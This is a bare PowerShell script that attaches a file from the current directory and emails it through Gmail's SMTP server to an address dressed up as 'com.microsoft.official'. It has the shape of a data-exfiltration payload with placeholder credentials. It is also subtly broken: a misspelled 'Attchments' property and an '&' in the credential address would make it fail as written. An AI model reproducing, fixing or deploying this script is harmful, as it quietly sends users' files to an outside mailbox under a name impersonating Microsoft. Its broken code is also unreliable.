$location = ($pwd).path


$smtpserver = "smtp.gmail.com"
$msg = new-object Net.Mail.MailMessage
$smtp = New-Object Net.Mail.SmtpClient($smtpServer)

$smtp.Timeout = 400000
$smtp.EnableSsl = $True
$smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official&gmail.com", "Password")

$msg.From = "com.microsoft.official@gmail.com"
$msg.To.Add("com.microsoft.official@gmail.com")

$msg.Subject = "SUBJECT"
$msg.Body = "BODY"


$file1 = "$location\file1.txt"
$msg.Attchments.Add($file1)

$smtp.Send($msg)


exit